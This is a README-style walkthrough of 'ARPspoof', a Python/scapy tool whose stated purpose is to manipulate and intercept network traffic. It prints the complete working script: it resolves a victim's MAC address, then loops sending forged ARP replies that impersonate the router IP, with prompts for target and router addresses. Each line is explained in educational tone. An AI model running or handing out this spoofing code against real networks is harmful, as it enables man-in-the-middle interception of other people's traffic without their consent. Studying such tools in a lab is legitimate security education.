## Description
***
ARPspoof is a tool written in python designed to perform ARP spoofing attack.
This tool allows the user to manipulate and intercept network traffic, is able to find MAC address from the victim IP address

ARP (address resolution protocol) a protocol that links an IP addres with a MAC of an endpoint.
## Code explanation
***
```
import subprocess, time
import scapy.all as scapy
from termcolor import colored as cl
from pyfiglet import figlet_format as ff
```
### `import subprocess, time`
***
`subprocess` is a module that allows you to spawn new processes.
`time` is a time management function.

### `import scapy.all as scapy`
***
Scapy is a powerful interactive packet manipulation library written in Python. Scapy is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. (https://scapy.net/)
import `scapy.all` assigns the alias `scapy`.

### `from termcolor import colored as cl`
***
Termcolor is an ANSI color formatting for output in terminal.  (https://pypi.org/project/termcolor/)
import the function `colored` from `termcolor` library and assigns alias `cl`.

### `from pyfiglet import figlet_format as ff`
***
It takes ASCII text and renders it in ACII art fonts 
import `filglet_format` from `pyfiglet` library and assigns alias `ff`.

```
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    broadcast_arp_request = broadcast/arp_request
    data = scapy.srp(broadcast_arp_request, timeout=1,        verbose=False)[0]
    mac = data[0][1].hwsrc
    return mac
```

create an ARP packet that request the MAC address associated with the given IP, this packet is encapsulated into the ethernet packet, srp send the packet and wait for response, the MAC got extracted from the response
### def get_mac_address(ip)
***
definition of the function `get_mac_address`, take the IP address and uses to make ARP request.

### arp_request = scapy.ARP(pstd=ip)
***
scapy.ARP create an ARP request, protocol destination (pdst) set the destination IP.


### broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
***
create an ethernet packet, with broadcast MAC setted.

### broadcast_arp_request = broadcast/arp_request
***
we used `/` to combine both ARP and broadcast ethernet Packet, this will make the endpoint to answer back with his MAC address.

### data = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
***
`srp()` function send packet and recives packets at layer 2, `broadcas_arp_request` the packet we created, 
`timeout=1` wait 1 second,
`false` disable the detailed output, 
`srp` return a tuple, where the first element contain all the responses, [0] take that list

### mac = data{0}{1}.hwsrc
***
the MAC address got extracted from the answer, `data` take the element from the list that contains request and response, `[1]` take the request
`hwsrc` contains the MAC address of the endpoint who sended the response

### return = mac
***
output the MAC 

```
def arp_spoofing(tip, rip):
    tmac = get_mac_address(tip)
    cnt = 0
    while True:
        try:
            print(cl('='*50, 'red'))
            print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing program\n\t\t\t-An AYLIT production', 'red'))
            print(cl('='*50, 'red'))
            packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=rip)
            scapy.send(packet, verbose=False)
            cnt += 2
            print(cl(f'Packets sent: {str(cnt)}', 'green'))
            time.sleep(1)
            subprocess.call('clear', shell=True)
        except KeyboardInterrupt:
            print(cl(f'Quitting program...', 'red'))
            break
```

### def arp_spoofing(tip, rip)
***
definition of the function `arp_spoofing(tip, rip)` target ip/router ip
### tmac = get_mac_address(tip)
call the function `get_mac_address` taking the MAC of the target ip, the result is stored into tmac

### cnt = 0
***
count the packet and track the number of packets

``` 
while True:
        try:
            print(cl('='*50, 'red'))
            print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing
            program\n\t\t\t-An AYLIT production', 'red'))
            print(cl('='*50, 'red'))
            packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac psrc=rip)
            scapy.send(packet, verbose=False)
            cnt += 2
            print(cl(f'Packets sent: {str(cnt)}', 'green'))
            time.sleep(1)
            subprocess.call('clear', shell=True)
        except KeyboardInterrupt:
            print(cl(f'Quitting program...', 'red'))
            break
```
***
`print(cl('='*50, 'red'))
`print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing
`program\n\t\t\t-An AYLIT production', 'red'))print(cl('='*50, 'red'))` graphic stuff

### packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac psrc=rip)
***
create a packet containing all the components, `op=2` specify the kind of ARP operation, 2 specify response, `pdst=tip` set the destination IP, `hwdst=tmac` set the MAC, `psrc=rip` set the source IP that will be covered with rip

### scapy.send(packet, verbose=False)
***
send the packet, `false` supress the detailed output


`cnt += 2` +2 on the counter
`print(cl(f'Packets sent: {str(cnt)}', 'green')` print the number of packets sent
`time.sleep(1)` introduce 1 second pause

### subprocess.call(`clear`, shell=True)
***
clear the terminal

### except KeyboardInterrupt: print(cl(f'Quitting program...', 'red')) break
***
when a user press `ctrl + c` an exit message get printed, `break` quit the cicle

```
subprocess.call('clear', shell=True)

print(cl('='*50, 'red'))
print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing program\n\t\t\t-An AYLIT production', 'red'))
print(cl('='*50, 'red'))

target_ip = input(cl("Enter the target's IP:", 'yellow'))
router_ip = input(cl("Enter the router's IP:", 'yellow'))
subprocess.call('clear', shell=True)

arp_spoofing(target_ip, router_ip)
```

### subprocess.call('clear', shell=True)
***
clear the terminal

`print(cl('='*50, 'red'))
`print(cl(ff('ARPSpoof')+'\n\t\t\t-ARP Spoofing program\n\t\t\t-An AYLIT production', 'red'))
`print(cl('='*50, 'red'))`  
***
graphic stuffs

### target_ip = input(cl("Enter the target's IP:", 'yellow'))
***
ask the user to insert target IP

### router_ip = input(cl("Enter the router's IP:", 'yellow'))
***
ask the user to insert router IP

### subprocess.call('clear', shell=True)
clear the terminal

### arp_spoofing(target_ip, router_ip)
***
call the function `arp_spoofing` using the target/router IP asked
